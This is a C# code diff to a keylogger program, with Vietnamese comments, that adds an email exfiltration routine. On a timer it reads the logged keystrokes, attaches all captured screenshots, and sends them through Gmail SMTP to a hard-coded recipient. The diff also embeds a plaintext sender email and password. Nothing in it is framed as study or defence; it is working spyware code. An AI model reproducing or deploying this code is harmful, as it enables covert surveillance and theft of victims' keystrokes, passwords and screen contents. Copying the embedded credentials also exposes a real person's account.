@@ -5,6 +5,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -208,6 +209,9 @@ namespace KeyLogger
                     if(interval % captureTime == 0)
                         CaptureScreen();
 
+                    if (interval % MailTime == 0)
+                        SendMail();
+
                     interval++;
 
                     if (interval >= 1000000)
@@ -242,6 +246,61 @@ namespace KeyLogger
         {
             IntPtr console = GetConsoleWindow();
             ShowWindow(console, SW_SHOW);
+        }
+        #endregion
+
+        #region Gửi mail
+        static int MailTime = 20000;
+        static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("minhthuanpttt@gmail.com");         //Mail sẽ gửi thông tin đi
+                mail.To.Add("transfermirrorofneymar@gmail.com");                //Mail nhận đc thông tin
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Thông tin: \n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+
+                //Chỉ lấy nội dung file log.txt
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+
+                //Lấy tất cả hình ảnh trong thư mục đã cài đặt
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+                
+                //Đính kèm file ảnh để gửi
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                }
+
+                SmtpServer.Port = 587;
+                //Điền thông tin mail sẽ gửi thông tin
+                SmtpServer.Credentials = new System.Net.NetworkCredential("minhthuanpttt@gmail.com", "Yourluckysmile2004");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Send mail!");
+
+                // Dùng đường dẫn bên dưới để bật quyền cho phép truy cập ở mail gửi thông tin
+                // https://www.google.com/settings/u/1/security/lesssecureapps
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
         }
         #endregion
 
